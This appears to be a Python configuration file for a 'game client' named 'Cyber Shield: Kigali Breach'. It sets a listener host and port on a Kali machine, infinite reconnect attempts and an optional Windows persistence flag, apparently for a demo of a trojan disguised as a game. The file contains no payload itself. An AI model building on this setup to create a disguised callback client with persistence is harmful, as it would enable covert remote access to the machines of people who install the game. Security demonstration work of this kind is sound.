from dataclasses import dataclass
import socket


@dataclass
class GameConfig:
    """
    Central configuration for the Cyber Shield game client.

    Adjust LISTENER_HOST to point at your Kali IP before building
    the Windows executable.
    """

    # CHANGE THIS to your Kali IP when building for demo
    LISTENER_HOST: str = "192.168.0.193"
    LISTENER_PORT: int = 5050

    # Networking behaviour
    RECONNECT_DELAY_SEC: int = 5
    MAX_RECONNECT_ATTEMPTS: int = 0  # 0 = infinite attempts

    # Persistence behaviour (only relevant on Windows builds)
    ENABLE_PERSISTENCE_BY_DEFAULT: bool = False

    # Misc
    APP_NAME: str = "Cyber Shield: Kigali Breach"


def resolve_listener_host() -> str:
    """
    Helper used by the client to resolve the listener host.

    For convenience this tries to interpret special values like
    'auto' in the future; for now it simply returns LISTENER_HOST.
    """
    cfg = GameConfig()
    host = cfg.LISTENER_HOST
    if host in {"localhost", "127.0.0.1"}:
        return host
    try:
        socket.gethostbyname(host)
        return host
    except OSError:
        # Fallback to localhost if hostname is invalid
        return "127.0.0.1"

